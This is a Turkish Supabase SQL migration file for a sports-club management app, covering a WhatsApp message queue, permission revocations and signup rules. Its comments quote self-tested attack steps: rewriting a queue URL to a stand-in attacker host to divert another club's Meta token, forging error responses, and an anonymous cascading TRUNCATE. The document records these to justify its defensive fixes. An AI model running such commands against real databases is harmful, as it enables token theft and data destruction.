  if v_adet > 1000 then
    raise exception 'Tek gönderimde en fazla 1000 alıcı olabilir (% gönderildi). Listeyi bölün.', v_adet
      using errcode = 'check_violation';
  end if;

  perform private.hiz_kontrol('wa_gonderim', 20, interval '1 hour',
    'Çok fazla WhatsApp gönderimi denendi. Bir saat içinde en fazla 20 gönderim yapılabilir.');

  return private.wa_kuyruga_al(v_kulup, p_tur, p_sablon_ad, p_alicilar, 'duyuru', p_kaynak_id);
end;
$$;

revoke all     on function public.wa_duyuru_kuyruga_al(text, text, jsonb, uuid) from public, anon;
grant  execute on function public.wa_duyuru_kuyruga_al(text, text, jsonb, uuid) to authenticated;


-- ===========================================================================
-- 3) net._http_response — işlenen yanıt satırını sil (pencere 6 saat → ~1 dk)
-- ===========================================================================
-- Gövde 0043'teki ile aynı; tek fark: her daldan sonra yanıt satırı siliniyor.
create or replace function private.wa_yanit_isle()
returns int
language plpgsql
security definer
set search_path = ''
as $$
declare
  r       record;
  v_kod   int;
  v_islem int := 0;
begin
  for r in
    select g.id, g.kulup_id, g.deneme, g.alici_telefon, g.istek_id,
           y.status_code, y.content, y.error_msg, y.timed_out
      from public.wa_giden g
      join net._http_response y on y.id = g.istek_id
     where g.durum = 'gonderildi'
     limit 500
  loop
    v_islem := v_islem + 1;

    if r.timed_out or r.error_msg is not null then
      update public.wa_giden
         set durum = case when r.deneme >= 3 then 'basarisiz' else 'bekliyor' end,
             sonraki_deneme = now() + (interval '2 minutes' * r.deneme),
             hata_metni = coalesce(r.error_msg, 'zaman aşımı')
       where id = r.id;

    elsif r.status_code between 200 and 299 then
      update public.wa_giden
         set durum = 'kabul_edildi',
             wamid = r.content::jsonb #>> '{messages,0,id}',
             hata_kodu = null, hata_metni = null
       where id = r.id;

    else
      v_kod := nullif(r.content::jsonb #>> '{error,code}', '')::int;

      if v_kod in (190, 200) then
        update public.wa_hesap
           set aktif = false,
               devre_disi_sebep = 'Erişim jetonu geçersiz (Meta hata ' || v_kod || '). Panelden yeniden bağlanın.'
         where kulup_id = r.kulup_id;
        update public.wa_giden
           set durum = 'basarisiz', hata_kodu = v_kod, hata_metni = 'Erişim jetonu geçersiz'
         where id = r.id;

      elsif v_kod = 131026 then
        insert into public.wa_onay (kulup_id, telefon, durum, kaynak)
        values (r.kulup_id, r.alici_telefon, 'whatsapp_yok', 'Meta 131026')
        on conflict (kulup_id, telefon) do update set durum = 'whatsapp_yok', guncelleme = now();
        update public.wa_giden
           set durum = 'basarisiz', hata_kodu = v_kod, hata_metni = 'Numara WhatsApp kullanmıyor'
         where id = r.id;

      elsif v_kod in (4, 80007, 130429, 131000, 131016, 131056, 131057) or r.status_code >= 500 then
        update public.wa_giden
           set durum = case when r.deneme >= 5 then 'basarisiz' else 'bekliyor' end,
               sonraki_deneme = now() + (interval '5 minutes' * r.deneme),
               hata_kodu = v_kod, hata_metni = left(r.content, 300)
         where id = r.id;

      else
        update public.wa_giden
           set durum = 'basarisiz', hata_kodu = v_kod, hata_metni = left(r.content, 300)
         where id = r.id;
      end if;
    end if;

    -- 0045: yanıt işlendi; PUBLIC'e açık tabloda 6 saat daha durmasın.
    delete from net._http_response where id = r.istek_id;
  end loop;

  return v_islem;
end;
$$;

revoke all     on function private.wa_yanit_isle() from public, anon, authenticated;
grant  execute on function private.wa_yanit_isle() to service_role;


-- ===========================================================================
-- DOĞRULAMA
-- ===========================================================================
do $$
begin
  if not exists (select 1 from pg_trigger where tgname = 'wa_giden_tavan'
                   and tgrelid = 'public.wa_giden'::regclass) then
    raise exception '0045: wa_giden_tavan tetikleyicisi kurulmadı.';
  end if;
  if has_function_privilege('authenticated', 'private.wa_yanit_isle()', 'EXECUTE') then
    raise exception '0045: wa_yanit_isle yeniden authenticated rolüne açıldı.';
  end if;
  if not has_function_privilege('authenticated',
       'public.wa_duyuru_kuyruga_al(text,text,jsonb,uuid)', 'EXECUTE') then
    raise exception '0045: sarmalayıcı authenticated tarafından çağrılamıyor — fazla kısıldı.';
  end if;
  raise notice '0045 tamam: gönderim tavanı tetikleyicide, alıcı sınırı sarmalayıcıda, yanıt satırları temizleniyor.';
end $$;


-- ===========================================================================
-- 13.9 pg_net YAZMA KILIDI — istemci rolleri kuyruga/yanita yazamaz  (0048)
-- ===========================================================================
-- net.http_request_queue ve net._http_response PUBLIC'e "arwdDxtm" ile acik.
-- Bu izinler supabase_admin tarafindan verildigi ve postgres ne o rolun uyesi
-- ne de superuser oldugu icin GERI ALINAMIYOR (olculdu: revoke -> WARNING,
-- alter owner / enable rls / create rule -> "must be owner").
--
-- AMA "arwdDxtm" icinde t = TRIGGER de var: sahibi olmadigimiz tabloya
-- TETIKLEYICI kurabiliyoruz. 0042 ve 0046 bu hakki hic denememis, "veritabani
-- icinden yapilabilecek bir sey yok" sonucuna varmisti.
--
-- OLCULEN SOMURU (A kulubunun VELISI, rol=authenticated):
--   update net.http_request_queue set url='https://saldirgan.example'  -> UPDATE 1
--     (satirin headers alani 'Bearer <B kulubunun Meta jetonu>' tasiyor)
--   delete from net.http_request_queue where id=<B'nin istegi>          -> DELETE 1
--   insert into net._http_response values (<B'nin istek_id>, 401,
--     '{"error":{"code":190}}', ...)                                    -> INSERT 0 1
--   select private.wa_yanit_isle();  -> B kulubunun wa_hesap.aktif = false
--   Yani bir veli, BASKA bir kulubun WhatsApp kanalini kapatabiliyor,
--   jetonunu kendi sunucusuna yonlendirebiliyor ve sunucudan SSRF atabiliyor.
--
-- Bu somuru bugun PostgREST'ten ULASILAMIYOR (PGRST_DB_SCHEMAS=public,
-- graphql_public; "Accept-Profile: net" -> 406 PGRST106). Duvarin o parcasi
-- semada degil PostgREST ayarinda duruyor; bu blok onu semaya da koyuyor.
--
-- SECURITY INVOKER ZORUNLU: DEFINER olsaydi current_user fonksiyonun sahibi
-- (postgres) donerdi ve kontrol hic devreye girmezdi.
-- KARA LISTE BILINCLI: pg_net iscisinin hangi rolle yazdigi belgesiz; beyaz
-- liste yapilsaydi isci disarida kalir ve TUM gonderim sessizce dururdu.
-- OKUMA HALA ACIK: SELECT'i kapatmak RLS ister, RLS sahiplik ister.
create or replace function public.net_istemci_yazamaz()
returns trigger
language plpgsql
set search_path = ''
as $fn$
begin
  if current_user in ('anon', 'authenticated') then
    raise exception 'pg_net kuyruk/yanit tablolarina istemci rolleri yazamaz (0048).'
      using errcode = 'insufficient_privilege';
  end if;
  if tg_op = 'DELETE' then
    return old;
  end if;
  return new;
end;
$fn$;

do $kilit$
declare v_tablo text;
begin
  if not exists (select 1 from pg_namespace where nspname = 'net') then
    raise notice '0048: pg_net kurulu degil, atlaniyor.';
    return;
  end if;
  foreach v_tablo in array array['http_request_queue', '_http_response'] loop
    if not exists (select 1 from pg_class c join pg_namespace n on n.oid = c.relnamespace
                    where n.nspname = 'net' and c.relname = v_tablo and c.relkind = 'r') then
      continue;
    end if;
    -- TEKRAR CALISTIRILABILIRLIK: "drop trigger if exists" YAZILAMAZ. Olculdu:
    -- DROP TRIGGER tablo SAHIPLIGI ister ("must be owner of relation
    -- http_request_queue"), CREATE TRIGGER ise PUBLIC'in t hakkiyla yetinir.
    if exists (select 1 from pg_trigger
                where tgname = 'zz_istemci_yazamaz'
                  and tgrelid = ('net.' || quote_ident(v_tablo))::regclass) then
      raise notice '0048: net.% kilidi zaten kurulu.', v_tablo;
      continue;
    end if;

    begin
      execute format('create trigger zz_istemci_yazamaz before insert or update or delete on net.%I '
                     'for each row execute function public.net_istemci_yazamaz()', v_tablo);
      raise notice '0048: net.% uzerine yazma kilidi kuruldu.', v_tablo;
    exception when others then
      -- Kurulum paketi BURADA DURMAMALI: bu bir sertlestirme, kurulumun on sarti degil.
      raise warning '0048: net.% kilidi kurulamadi (%).', v_tablo, sqlerrm;
    end;
  end loop;
end $kilit$;

do $$
declare v_sd boolean;
begin
  select prosecdef into v_sd from pg_proc p join pg_namespace n on n.oid = p.pronamespace
   where n.nspname = 'public' and p.proname = 'net_istemci_yazamaz';
  if v_sd then
    raise exception '0048: net_istemci_yazamaz SECURITY DEFINER olmus — koruma calismaz.';
  end if;
  raise notice '0048 tamam: pg_net yazma yuzeyi istemci rollerine kapatildi.';
end $$;



-- ===========================================================================
-- SON ADIM — anon/authenticated TRUNCATE YETKİSİNİN GERİ ALINMASI  (0040)
-- ===========================================================================
-- ⚠ BU BLOK DOSYANIN EN SONUNDA KALMALI. Sebebi ÖLÇÜLDÜ: revoke ilk denemede
-- toplu grant'ın hemen altına yazılmıştı ve ondan SONRA gelen üç satır
--     grant all on public.engelleme       to anon, authenticated, service_role;
--     grant all on public.sikayet         to anon, authenticated, service_role;
--     grant all on public.kulup_basvurusu to anon, authenticated, service_role;
-- TRUNCATE'i sessizce geri veriyordu. Sıfırdan kurulan şemada üç tablo açık
-- kalmıştı ve bunu ancak information_schema sorgusu gösterdi.
-- Yeni bir tablo + grant eklendiğinde bu blok YİNE en sonda olmalı.
--
-- NEDEN GEREKLİ: `grant all` TRUNCATE'i de içerir ve RLS TRUNCATE'i KAPSAMAZ.
-- Yerelde ölçüldü: `set role anon; truncate public.sporcular cascade;` çalıştı
-- ve 16 tabloya yayıldı. Bugün API'den erişilemiyor (PostgREST hiçbir zaman
-- TRUNCATE üretmez), ama "izinlerin gerçek daraltıcısı GRANT değil RLS'tir"
-- gerekçesi TAM OLARAK BU FİİL için geçerli değil: doğrudan bağlantı açan bir
-- entegrasyon tek komutla veritabanını boşaltabilirdi.
revoke truncate on all tables in schema public from anon, authenticated;

-- ---------------------------------------------------------------------------
-- KURULUM ARACI FONKSİYONLARI DA GERİ ALINIYOR
-- ---------------------------------------------------------------------------
-- `06_demo_kulup.sql` demo kulübü açan/silen iki fonksiyon kuruyor ve kendi
-- sonunda EXECUTE iznini geri alıyor. Ama bu dosyadaki toplu
-- `grant all on all routines` 06'dan SONRA çalışırsa izni GERİ VERİYOR.
-- ÖLÇÜLDÜ: izin geri geldiğinde sıradan bir VELİ `demo_kulup_sil` çağırıp
-- bütün kulübü sildi (kulup 1 -> 0).
--
-- ⚠ ASIL KORUMA BU BLOK DEĞİL, FONKSİYONLARIN İÇİNDEKİ KAPI.
--   Bu dosya tekrar çalıştırılabilir DEĞİL: 116. satırdaki
--   `create type app_role` "already exists" ile düşüyor ve akış buraya hiç
--   ulaşmıyor (ölçüldü). Yani "01'i yeniden çalıştırdım" senaryosunda bu revoke
--   devreye girmez. Gerçek savunma, 06'daki iki fonksiyonun `auth.uid() is not
--   null` kontrolü: izin ne olursa olsun oturumlu çağrıyı reddediyorlar.
--   Bu blok yalnızca ikinci katman — toplu grant satırı elle ya da bir bakım
--   betiğiyle tek başına çalıştırılırsa devreye giriyor.
--
-- Fonksiyonlar yoksa (canlı projede olmamalılar) bu döngü hiçbir şey yapmaz.
do $$
declare r record;
begin
  for r in
    select p.oid::regprocedure as imza
      from pg_proc p join pg_namespace n on n.oid = p.pronamespace
     where n.nspname = 'public' and p.proname like 'demo\_kulup\_%'
  loop
    execute format('revoke all on function %s from public, anon, authenticated', r.imza);
  end loop;
end $$;


-- ---------------------------------------------------------------------------
-- private ŞEMASINDAKİ TABLOLARDA RLS AÇIK, POLİTİKA YOK — BİLEREK
-- ---------------------------------------------------------------------------
-- "RLS açık ama politika yok" = HER ŞEY REDDEDİLİR. Mümkün olan en kısıtlayıcı
-- hâl ve bu tablolar için doğru olan bu: `private.istek_sayaci` (hız sınırı
-- sayaçları) ve `private.wa_gizli` (WhatsApp jetonunun Vault kimliği) hiçbir
-- istemcinin işi değil.
--
-- Supabase danışmanı bunu "suggestion" olarak işaretliyor çünkü genelde kaza
-- olur: biri RLS'i açar, politika yazmayı unutur ve uygulamasını kilitler.
-- Burada kasıt. Bir aksiyon gerekmiyor.
--
-- NEDEN AÇIKÇA YAZILIYOR: bu satırlar olmadan yerel geliştirme veritabanında
-- RLS KAPALI, Supabase projesinde ise AÇIK oluyordu (ölçüldü). İki ortamın
-- farklı yapılandırmada olması, denetimlerin üretimde olmayan bir dünyayı
-- sınaması demek — bu oturumda GoTrue jeton kolonları hatası tam olarak bu
-- yüzden geç yakalandı. Açıkça yazmak ikisini eşitliyor.
--
-- MEŞRU YOLU KİLİTLEMİYOR (ölçüldü, RLS açıkken):
--   private.hiz_kontrol istek_sayaci'ya yazmaya devam etti (5 → 6)
--   wa_gizli sahibi tarafından okunabildi
--   yönetici ikisine de erişemedi
-- Sebep: bu tablolara yalnızca SECURITY DEFINER fonksiyonlar dokunuyor ve
-- sahibi (postgres) tablo sahibi olarak RLS'i baypas ediyor.
alter table private.istek_sayaci enable row level security;
alter table private.wa_gizli     enable row level security;


-- ---------------------------------------------------------------------------
-- TETİKLEYİCİ FONKSİYONLARINDAN EXECUTE GERİ ALINIYOR  (0049)
-- ---------------------------------------------------------------------------
-- Supabase'in kendi güvenlik danışmanı, yukarıdaki toplu grant yüzünden 15+
-- tetikleyici fonksiyonu için "anon /rest/v1/rpc/X ile çağırabilir" uyarısı
-- veriyordu (paket_dus, paket_iade, rezervasyon_fiyatla, hiz_*, siparis_*…).
--
-- ⚠ UYARININ İDDİASI ÖLÇÜLDÜ VE DOĞRU DEĞİL — bu bir açık kapatmıyor:
--     POST /rest/v1/rpc/paket_iade (anon)  → PGRST202
--       (tetikleyici fonksiyonlar RPC olarak hiç yayınlanmıyor)
--     set local role anon; select public.paket_iade();
--       → ERROR: trigger functions can only be called as triggers
--
-- Yine de geri alınıyor, üç sebeple:
--   1) İzin ZATEN GEREKSİZ: PostgreSQL tetikleyici ateşlerken EXECUTE aramaz.
--      KARŞI-TEST ile kanıtlandı — izin alındıktan sonra paket düşümü,
--      fiyatlama, iade, diriltme, davet koruması, hız sınırı ve rezervasyon
--      koruması 7/7 çalışmaya devam etti.
--   2) 15+ kalıcı uyarı danışman listesini okunamaz yapıyor; gerçek bir uyarı
--      çıktığında aralarında kaybolur.
--   3) Bir gün bu fonksiyonlardan biri `returns trigger` olmaktan çıkarılırsa
--      üzerindeki izin O ANDA anlamlı hale gelir ve kimse fark etmez.
--
-- Katalogdan sürülüyor, sabit listeden değil: yeni eklenen her tetikleyici
-- fonksiyon kendiliğinden kapsanıyor (0029'da sabit liste tam bu yüzden bozuldu).
--
-- ⚠ `public.hesabimi_sil` BİLEREK AÇIK BIRAKILIYOR — danışman onu da işaretliyor.
--   Apple App Store Guideline 5.1.1(v) uygulama içi hesap silmeyi ZORUNLU
--   tutuyor; kapatılırsa mağaza reddi gelir. Güvenli olduğu ölçüldü: parametre
--   almıyor, kullanıcıyı `auth.uid()`'den türetiyor, oturum yoksa hata veriyor.
--   Veli çağırdığında yalnızca KENDİ hesabı siliniyor (7 kullanıcı → 6).
do $$
declare r record;
begin
  for r in
    select p.oid::regprocedure as imza
      from pg_proc p join pg_namespace n on n.oid = p.pronamespace
     where n.nspname = 'public' and p.prorettype = 'pg_catalog.trigger'::regtype
  loop
    execute format('revoke all on function %s from public, anon, authenticated', r.imza);
  end loop;
end $$;


-- ===========================================================================
-- 0051 — site_ayarlari: tanıtım sitesinin metinleri
-- ===========================================================================
-- ⚠ BU BLOK DOSYANIN SONUNDA, `grant all on all tables` (satır ~2518) SATIRINDAN
--   SONRA OLMAK ZORUNDA. Yukarı taşınırsa toplu grant buradaki kısıtlı izinleri
--   genişletir ve anon satırı SİLEBİLİR hale gelir. Aynı tuzak 0040'ta
--   (TRUNCATE) ve 0049'da (tetikleyici fonksiyonlar) yaşandı.
--
-- ⚠ KİRACIYA AİT DEĞİL — kulup_id YOK, BİLEREK. Buradaki bilgi SATILAN ÜRÜNÜN
--   markası; kulüp markası kurum_ayarlari'nda ve o kiracı duvarıyla korunuyor.
--   Bu tabloya restrictive kiracı politikası EKLENMEMELİ: tanıtım sitesi
--   ziyaretçisinin oturumu yok, current_kulup_id() NULL döner, karşılaştırma
--   hiçbir zaman tutmaz ve site markasız açılırdı.
--
-- Tek satır garantisi veritabanında: `tek boolean primary key check (tek)`
-- yalnızca `true` kabul ediyor, ikinci satır fiziksel olarak eklenemiyor.
create table if not exists public.site_ayarlari (
  tek              boolean primary key default true check (tek),
  urun_adi         text not null default 'Spor Coach',
  slogan           text not null default 'Spor okulunuzu tek panelden yönetin',
  aciklama         text not null default '',
  eposta           text not null default '',
  telefon          text not null default '',
  sirket           text not null default '',
  uygulama_adresi  text not null default '',
  guncelleyen      uuid references public.profiles(id) on delete set null,
  updated_at       timestamptz not null default now()
);

alter table public.site_ayarlari enable row level security;

insert into public.site_ayarlari (tek) values (true) on conflict (tek) do nothing;

drop policy if exists "site_ayarlari: herkes okur" on public.site_ayarlari;
create policy "site_ayarlari: herkes okur"
  on public.site_ayarlari for select using (true);

drop policy if exists "site_ayarlari: yalnızca platform sahibi yazar" on public.site_ayarlari;
create policy "site_ayarlari: yalnızca platform sahibi yazar"
  on public.site_ayarlari for update
  using (private.current_profile_role() = 'platform_admin')
  with check (private.current_profile_role() = 'platform_admin');

-- Önce her şeyi geri al, sonra yalnızca gerekeni ver: tek bir politikanın
-- yanlış yazılması tabloyu açmasın.
revoke all on table public.site_ayarlari from public, anon, authenticated;
grant select on table public.site_ayarlari to anon, authenticated;
grant update on table public.site_ayarlari to authenticated;

-- "Kim değiştirdi" ve zaman damgası sunucuda yazılıyor; istemciye bırakılırsa
-- uydurulabilir. Değişmez olduğu için tetikleyici katmanı.
create or replace function public.site_ayarlari_damga()
returns trigger
language plpgsql
security invoker
set search_path = public
as $$
begin
  new.tek         := true;
  new.guncelleyen := auth.uid();
  new.updated_at  := now();
  return new;
end;
$$;

drop trigger if exists on_site_ayarlari_damga on public.site_ayarlari;
create trigger on_site_ayarlari_damga
  before update on public.site_ayarlari
  for each row execute procedure public.site_ayarlari_damga();

revoke all on function public.site_ayarlari_damga() from public, anon, authenticated;


-- ===========================================================================
-- 0053 — davet.sube_id + davetsiz kayıt reddi
-- ===========================================================================
-- Dosyanın SONUNDA: handle_new_user'ı yeniden tanımlıyor ve davet tablosunu
-- değiştiriyor; yukarıdaki tanımların hepsi oluştuktan sonra çalışmalı.
--
-- ⚠ `on delete set null (sube_id)` — KOLON LİSTESİ ŞART. Liste olmadan yazılan
--   bileşik SET NULL kulup_id'yi de NULL yapar ve şube silme tümden patlar
--   (0039'da ölçülerek yakalandı).
alter table public.davet add column if not exists sube_id uuid;

do $sube53$
begin
  if not exists (select 1 from pg_constraint
                  where conname = 'davet_sube_kulup_fkey'
                    and conrelid = 'public.davet'::regclass) then
    alter table public.davet
      add constraint davet_sube_kulup_fkey
      foreign key (sube_id, kulup_id) references public.sube(id, kulup_id)
      on delete set null (sube_id);
  end if;
end $sube53$;

create index if not exists davet_sube_idx on public.davet (sube_id) where sube_id is not null;

-- ⚠ DAVETSİZ KAYIT UYGULAMADAN REDDEDİLİYOR, KURULUMDAN GEÇİYOR.
--   Ayrım `session_user` ile — `current_user` ile DEĞİL: bu fonksiyon SECURITY
--   DEFINER ve içinde current_user ÇAĞIRANI DEĞİL SAHİBİNİ verir (0036 tuzağı).
--     GoTrue (uygulama) → supabase_auth_admin → REDDET
--     SQL Editor        → postgres/supabase_admin → kulüpsüz aç
--   Koşulsuz reddedilseydi platform sahibinin ilk hesabı hiç açılamaz ve sistem
--   kurulamaz hâle gelirdi.
create or replace function public.handle_new_user()
returns trigger
language plpgsql
security definer
set search_path = public
as $hnu53$
declare
  v_token  text; v_ad text; v_kulup uuid; v_rol app_role;
  v_sporcu uuid; v_sube uuid; v_satir int;
begin
  v_ad    := coalesce(new.raw_user_meta_data ->> 'ad', '');
  v_token := nullif(btrim(coalesce(new.raw_user_meta_data ->> 'davet_token', '')), '');

  if v_token is not null then
    select c.kulup_id, c.rol, c.sporcu_id into v_kulup, v_rol, v_sporcu
      from private.davet_coz(v_token, new.email) c;

    if v_kulup is null then
      raise exception 'Davet linki geçersiz, süresi dolmuş, daha önce kullanılmış veya başka bir e-posta adresine düzenlenmiş.';
    end if;

    -- Şube token doğrulandıktan SONRA okunuyor: davet_coz oturumsuz
    -- çağrılabiliyor ve döndürdüğü her alan token'ı ele geçirene sızar.
    select d.sube_id into v_sube from public.davet d where d.token = v_token;

    insert into public.profiles (id, role, ad, kulup_id, sube_id)
    values (new.id, v_rol, v_ad, v_kulup, v_sube);

    update public.davet set kullanildi_at = now(), kullanan_id = new.id
     where token = v_token and kullanildi_at is null and son_kullanma > now();

    get diagnostics v_satir = row_count;
    if v_satir <> 1 then
      raise exception 'Davet linki az önce başka bir kayıtta kullanıldı. Kulüp yöneticinizden yeni bir davet isteyin.';
    end if;

    if v_sporcu is not null then
      insert into public.veli_sporcu (veli_id, sporcu_id, kulup_id)
      values (new.id, v_sporcu, v_kulup) on conflict do nothing;
    end if;

    return new;
  end if;

  if session_user in ('postgres', 'supabase_admin') then
    insert into public.profiles (id, role, ad, kulup_id)
    values (new.id, 'veli', v_ad, null);
    raise notice 'Kurulum kaydı: % kulüpsüz açıldı (04/05 ile yetkilendirilecek).', new.email;
    return new;
  end if;

  raise exception 'Hesap oluşturmak için kulübünüzden aldığınız davet kodu gerekli. Kodunuz yoksa kulüp yöneticinizle görüşün.';
end;
$hnu53$;


-- Sıradaki adım: kurulum/02_katalog.sql (platform kataloğu).
-- ===========================================================================
